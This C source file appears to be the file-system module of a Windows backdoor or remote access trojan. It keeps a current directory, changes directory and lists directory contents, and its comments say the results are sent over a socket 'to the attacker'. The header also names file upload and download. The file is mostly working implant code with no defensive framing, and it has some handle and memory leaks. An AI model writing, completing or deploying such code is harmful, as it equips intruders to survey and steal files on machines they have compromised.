/*
Functions for file system manipulation
This includes directory traversal, listing directory contents,
		uploading/downloading files, and similar functionality
*/

#include "files.h"
#include "utils.h"

/*
Global variable to keep track of the current directory
All commands using file paths will treat this as the default/base file path
*/
char currentDirectory[MAX_PATH];

/*
Remove the last slash and everything following it from the current directory
*/
void removeLastSlash() {
	for (int i = MAX_PATH - 1; i >= 0; i--) {
		if (currentDirectory[i] == '\\' || currentDirectory[i] == '/') {
			currentDirectory[i] = '\0';
			break;
		}
		currentDirectory[i] = '\0';
	}
}

/*
Initialize/reset the current directory to the directory this program launched from
Expects no arguments
Returns nothing
*/
void getLaunchDirectory() {
	GetModuleFileNameA(NULL, currentDirectory, MAX_PATH);
	removeLastSlash();
	printf("Current directory reset to \"%s\"\n", currentDirectory);
}

/*
Return the current directory
*/
char* getCurrentDirectory() {
	return currentDirectory;
}

/*
Change the current directory similar to using the 'cd' command in command prompt
Expects a file path and a socket as arguments
The file path can be relative ('Desktop') or absolute ('C:\Users\...\Desktop')
The socket will be used to send either an error message or the new current directory
Returns nothing, but the global 'currentDirectory' will be updated if successful
TODO - does 'currentDirectory' get overwritten if path canonicalize fails???
*/
void changeDirectory(char* dirName, SOCKET *sock) {
	// check the length of the new un-canonicalized path
	int newLen = strnlen(dirName, 4096);
	int currLen = strnlen(currentDirectory, MAX_PATH);
	if (newLen + currLen + 1 > MAX_PATH) {
		sendString("ERROR:Path name is too long!\n", sock);
		return;
	}
	// change any '/' in dirName to be '\'
	//for (int i = 0; i < MAX_PATH; i++) {
	//	if (dirName[i] == '/') {
	//		dirName[i] = '\\'; }
	//}
	// concatenate dirName to the current directory in a temporary buffer
	char buff[MAX_PATH];
	sprintf_s(buff, MAX_PATH, "%s\\%s", currentDirectory, dirName);
	printf("New path: %s\n", buff);
	// is the combined file path a directory?
	if (!PathIsDirectoryA(buff)) {
		sendString("ERROR:Path is not a directory!\n", sock);
		return;
	}
	// try to canonicalize the file path
	if (!PathCanonicalizeA(currentDirectory, buff)) {
		char msg[MAX_PATH + 70];
		sprintf_s(msg, MAX_PATH + 70, "ERROR:Failed to canonicalize \"%s\"! Error code: %d\n", buff, GetLastError());
		sendString(msg, sock);
		return;
	}
	// tell the attacker what the new current directory is
	char msg[MAX_PATH + 15];
	sprintf_s(msg, MAX_PATH + 15, "SUCCESS:%s", currentDirectory);
	sendString(msg, sock);
}

/*
List the contents of the current directory similar to using 'dir' or 'ls'
Expects a socket as the only argument
The socket will be used to send either an error message or the directory contents
Returns nothing
TODO - optional argument to list contents of an arbitrary directory
*/
void listDirectoryContents(SOCKET *sock) {
	HANDLE findHandle;
	WIN32_FIND_DATAA fileData;
	char searchPath[MAX_PATH];
	char * returnInfo;
	int returnLen = 0;
	DWORD error;

	// set the search path to be 'currentDirectory\.`
	sprintf_s(searchPath, MAX_PATH, "%s\\*.*", currentDirectory);

	// get the first result and check if it's valid
	findHandle = FindFirstFileA(searchPath, &fileData);
	if (findHandle == INVALID_HANDLE_VALUE) {
		char msg[50];
		sprintf_s(msg, 50, "ERROR:Failed to find first file: %d\n", GetLastError());
		sendString(msg, sock);
		return;
	}

	// get the sum of the length of all the file names + newline/null-terminator
	do {
		returnLen += strnlen(fileData.cFileName, MAX_PATH) + 1;
	} while (FindNextFileA(findHandle, &fileData));
	
	// did we run out of files to find or encounter an error?
	error = GetLastError();
	if (error != ERROR_NO_MORE_FILES) {
		char msg[50];
		sprintf_s(msg, 50, "ERROR:Failed to find next file: %d\n", error);
		sendString(msg, sock);
		return;
	}

	// create the string used to send the file names back to the attacker
	returnLen += 20; // buffer for extra chars added
	returnInfo = (char *)malloc(returnLen);
	if(returnInfo == NULL) {
		sendString("ERROR:Failed to allocate buffer\n", sock);
		return;
	}
	sprintf_s(returnInfo, returnLen, "SUCCESS:");

	// get the first result again and check if it's valid (should be)
	findHandle = FindFirstFileA(searchPath, &fileData);
	if (findHandle == INVALID_HANDLE_VALUE) {
		char msg[50];
		sprintf_s(msg, 50, "ERROR:Failed to find first file: %d\n", GetLastError());
		sendString(msg, sock);
		return;
	}

	// concatenate all the file names to the 'returnInfo' string
	do {
		// TODO - change this to use sprintf_s() instead of strcat_s()?
		strcat_s(returnInfo, returnLen, fileData.cFileName);
		strcat_s(returnInfo, returnLen, "\n");
	} while (FindNextFileA(findHandle, &fileData));

	// did we run out of files to find or encounter an error?
	error = GetLastError();
	if (error != ERROR_NO_MORE_FILES) {
		char msg[50];
		sprintf_s(msg, 50, "ERROR:Failed to find next file: %d\n", error);
		sendString(msg, sock);
		return;
	}

	// if we got this far, send the data
	sendString(returnInfo, sock);

	// free the return string and close the handle before returning
	free(returnInfo);
	FindClose(findHandle);
}